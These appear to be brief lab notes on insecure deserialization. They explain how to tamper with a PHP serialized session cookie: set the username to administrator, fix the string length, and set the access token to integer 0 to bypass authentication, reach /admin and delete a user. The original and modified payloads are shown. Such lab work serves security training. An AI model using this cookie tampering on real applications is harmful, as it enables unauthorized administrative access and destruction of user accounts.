# Modifying serialized data types

serialization-based session mechanism and is vulnerable to authentication bypass


Solving this lab is similar to the previous, except you are deleting the value of the access token
- Highlight the session cookie in repeater, then go into the Inspector tab:
1. Change username to administrator
2. Change the `s:12` to `s:13` (13 chars in "administrator")
3. Modify the access token to be an int of 0 `i:0`
4. Send a request to `GET /admin` with the modified session cookie
5. Then delete Carlos 

```php
// unmodded session cookie
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zq8h8ul1frtorajmvs1gi80nv2lelurw";}
```

```php
// modded session cookie
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
